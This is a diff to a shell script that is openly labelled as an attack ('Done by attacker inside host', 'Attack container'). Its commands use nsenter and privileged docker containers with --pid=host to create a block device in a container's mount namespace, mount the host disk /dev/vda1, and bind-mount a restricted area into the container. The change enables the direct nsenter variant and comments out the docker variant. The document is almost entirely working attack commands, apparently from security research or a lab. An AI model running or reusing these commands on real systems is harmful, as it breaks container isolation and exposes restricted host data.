@@ -10,24 +10,26 @@ major=$(cat major_num)
 minor=$(cat minor_num)
 dev=$(cat sdev_of_fs)
 
-#Done by host
-: <<'END'
-sudo nsenter --target ${container_pid} --mount --uts --ipc --net --pid -- mount /dev/vda1 /tmpmount
-sudo nsenter --target ${container_pid} --mount --uts --ipc --net --pid -- mount -o bind /tmpmount/${attack}/restricted_area /doot
-sudo nsenter --target ${container_pid} --mount --uts --ipc --net --pid -- umount /tmpmount
-END
+#Done by attacker inside host
+#: <<'END'
+nsenter --target ${container_pid} --mount mknod --mode 0600 ${dev} b ${major} ${minor}
+nsenter --target ${container_pid} --mount mkdir -p /tmpmount
+nsenter --target ${container_pid} --mount --uts --ipc --net --pid -- mount /dev/vda1 /tmpmount
+nsenter --target ${container_pid} --mount --uts --ipc --net --pid -- mount -o bind /tmpmount/${attack}/restricted_area /doot
+nsenter --target ${container_pid} --mount --uts --ipc --net --pid -- umount /tmpmount
+#END
 
 #Done by attacker no2
 #Attack host
 
 #Attack container
-#: <<'END'
+: <<'END'
 docker run --privileged --pid=host --rm -it debian:latest nsenter --target ${container_pid} --mount mknod --mode 0600 ${dev} b ${major} ${minor}
 docker run --privileged --pid=host --rm -it debian:latest nsenter --target ${container_pid} --mount mkdir -p /tmpmount
 docker run --privileged --pid=host --rm -it debian:latest nsenter --target ${container_pid} --mount mount ${dev} /tmpmount
 docker run --privileged --pid=host --rm -it debian:latest nsenter --target ${container_pid} --mount mount -o bind /tmpmount/${attack}/restricted_area /doot
 docker run --privileged --pid=host --rm -it debian:latest nsenter --target ${container_pid} --mount umount /tmpmount
-#END
+END
 
 rm major_num
 rm minor_num
